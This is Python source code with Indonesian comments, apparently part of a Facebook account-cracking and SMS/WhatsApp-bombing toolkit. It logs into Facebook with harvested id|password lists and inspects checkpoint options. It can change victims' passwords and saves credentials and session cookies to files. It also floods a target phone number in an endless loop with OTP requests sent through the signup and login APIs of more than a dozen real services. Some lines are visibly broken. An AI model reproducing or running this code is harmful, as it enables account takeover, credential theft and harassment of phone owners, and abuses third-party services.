	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s    [+] Opsi CheckPoint :   %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s    [+] Tap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s   [+] %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s    [+] Tidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
	
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(P,til,P,P,P))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mMasukan file [ Contoh %s: %sCP-%s.txt%s ]"%(P,til,P,P,P,waktu,P))
		opsi()
	except IOError:
		print ('%s%s\033[0mFile Tidak Ada'%(P,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNama file %s> %s"%(P,til,P,P,P))
	if romi == "":
		print(" [+] Isi Yang Benar "%(P,til));jeda(2)
		back()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mNama File %s\033[0m Tidak Tersedia"%(P,til,romi))
	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(P,til,P))
	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(P,til,P,P,P))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(P,til,P,P,P))
		if len(pw2) <= 5:
			print("%s%s Sandi Minimal 6 Karakter "%(P,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(P,til,P,P,P,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(P,str(nomor),P,P,P,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(P,til,P));jeda(0.07)
	input('%s%s%s[%s Enter%s ]'%(P,til,P,P,P))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(P,til))
		else:
			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,P))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s [+] %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(P,P,P,str(len(cek)),P,P));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(P,til,P,P,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (P,user,pwbaru[0],coki))
				else:
					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(P,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (P,user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s [+] \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(P))
			else:
				print("%s%s\033[0mTerjadi Kesalahan"%(P,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(P))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (P,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),P,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s [+] %s"%(P,oh))
	else:
		print("%s [+] \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(P))
		  
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input(' [+] Masukkan URL : ')
        print('\n [1] Source Payload')
        print(' [2] Parsed Payload')
        print(' [3] Source Code Post Requests')
        self.tanya = input(' [+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\n [+] Isi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
	global nomor
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
